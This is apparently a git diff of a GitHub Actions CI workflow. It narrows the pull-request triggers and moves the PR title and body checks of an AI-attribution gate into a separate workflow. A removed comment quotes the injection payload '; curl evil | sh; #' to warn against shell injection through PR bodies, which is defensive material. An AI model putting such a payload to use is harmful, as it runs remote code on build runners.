@@ -11,10 +11,18 @@ on:
       - 'v[0-9]+.[0-9]+.[0-9]+'
   pull_request:
     branches: [main]
-    # `edited` is required by the AI-attribution gate below. The default types are
-    # opened/synchronize/reopened, none of which fire on a title or body edit, so
-    # without it a PR can go green and then have the footer pasted into the body.
-    types: [opened, synchronize, reopened, edited]
+    # Code-validation event set: every event that can change the code or the
+    # effective merge result, and nothing else.
+    #
+    # `edited` is deliberately ABSENT. It was here so the AI-attribution gate
+    # re-ran on a title or body edit, which meant every metadata edit started the
+    # full build, test, package and security pipeline against a head commit whose
+    # content had not changed. That half of the gate now lives in
+    # pr-metadata-policy.yml, which owns the "PR metadata policy" required check.
+    #
+    # `ready_for_review` is present because leaving draft changes whether the PR is
+    # a merge candidate, and the required check must be conclusive for it.
+    types: [opened, synchronize, reopened, ready_for_review]
   # Manual runs are build-only. Publishing is possible only from an immutable
   # semver tag delivered by the push trigger above.
   workflow_dispatch:
@@ -22,10 +30,14 @@ on:
 permissions:
   contents: read
 
-# Adding `edited` to the PR triggers means title/body edits now spawn runs on the same
-# head sha. Without a concurrency group a run started before a body fix can finish after
-# the run started by the fix, leaving the REQUIRED context reporting the stale red. Tag
-# and main pushes are keyed by ref so a release is never cancelled by a later one.
+# Obsolete code-validation runs are cancelled when a NEWER HEAD COMMIT supersedes
+# them, so the newest head sha decides mergeability. Metadata edits can no longer
+# enter this group at all, because `edited` is not a trigger here - so a body fix
+# can never cancel a valid result for an unchanged head sha, which is how a
+# cancelled twin previously became the effective result and blocked a merge.
+#
+# Tag and main pushes are keyed by ref and never cancelled, so a release cannot be
+# aborted by a later one.
 concurrency:
   group: ci-${{ github.event.pull_request.number || github.ref }}
   cancel-in-progress: ${{ github.event_name == 'pull_request' }}
@@ -55,31 +67,32 @@ jobs:
       - name: Build
         run: npm run build
 
-      # AI-attribution gate for the two surfaces that are NOT files in the repo:
-      # the PR title/body and the commit messages. Tracked files (CHANGELOG.md,
-      # which ci.yml turns into the GitHub Release body, plus README/docs) are
-      # covered by the "ai-attribution" forbiddenPatterns rule in aahp.config.json,
-      # which already ran as part of `npm run build` above.
+      # AI-attribution gate for the COMMIT surfaces: commit messages and the
+      # author/committer identity fields across the PR's BASE..HEAD range. Their
+      # input is the commit range, so they belong with code validation and re-run
+      # only when the code changes.
       #
-      # This lives inside "Build and Test" on purpose: that job is a REQUIRED
-      # status check on main, so the gate blocks a merge today. A new top-level
-      # job would be advisory only until branch protection is updated to require it.
-      # dependabot is exempt for the same reason aahp-verify.yml exempts it: its PR
-      # bodies quote upstream release notes verbatim, it cannot edit its own body,
-      # and this step sits in a REQUIRED check with enforce_admins - so a quoted
-      # trailer upstream would hard-block a security update with no way out.
-      - name: No AI attribution in PR body or commit messages
+      # The PR TITLE and BODY halves moved to pr-metadata-policy.yml, which owns
+      # the "PR metadata policy" required check. Do not re-add them here: that is
+      # what forced `edited` into this workflow's triggers and made every body edit
+      # run the whole pipeline. One producer per required check.
+      #
+      # Tracked files (CHANGELOG.md, which ci.yml turns into the GitHub Release
+      # body, plus README/docs) are covered by the "ai-attribution"
+      # forbiddenPatterns rule in aahp.config.json, which already ran as part of
+      # `npm run build` above.
+      #
+      # dependabot is exempt for the same reason aahp-verify.yml exempts it: its
+      # commit messages quote upstream release notes, and this step sits in a
+      # REQUIRED check with enforce_admins - so a quoted trailer upstream would
+      # hard-block a security update with no way out.
+      - name: No AI attribution in commit messages or identity
         if: github.event_name == 'pull_request' && github.actor != 'dependabot[bot]'
         env:
-          # The PR title and body are attacker-controlled: anyone who can open a PR
-          # from a fork controls them. They MUST reach the script as environment
-          # variables. Never write ${{ github.event.pull_request.body }} inside a
-          # run: block - Actions substitutes the raw text into the script BEFORE
-          # bash parses it, so a body containing '; curl evil | sh; #' would execute
-          # on the runner. Below they are only ever read as quoted "$VAR", which
-          # bash never re-parses as code.
-          PR_TITLE: ${{ github.event.pull_request.title }}
-          PR_BODY: ${{ github.event.pull_request.body }}
+          # Event-payload values reach the script as environment variables and are
+          # only ever read as quoted "$VAR". Never write ${{ ... }} inside a run:
+          # block - Actions substitutes the raw text BEFORE bash parses it, so
+          # attacker-controlled content would execute on the runner.
           BASE_SHA: ${{ github.event.pull_request.base.sha }}
           HEAD_SHA: ${{ github.event.pull_request.head.sha }}
         run: |
@@ -107,16 +120,6 @@ jobs:
               exit 1
             fi
           done
-
-          if printf '%s' "$PR_TITLE" | grep -Eiq -- "$PATTERN"; then
-            echo "::error title=AI attribution in PR title::Remove the tool/model attribution. The author of record is the human. See CONTRIBUTING.md."
-            fail=1
-          fi
-
-          if printf '%s' "$PR_BODY" | grep -Eiq -- "$PATTERN"; then
-            echo "::error title=AI attribution in PR body::Remove the 'Generated with Claude Code' footer from the PR body. This repo is public and PR bodies are indexed."
-            fail=1
-          fi
 
           # Fail closed: if the range cannot be read, do NOT silently pass. A bare
           # `git log ... | grep` would swallow the git failure and report clean.
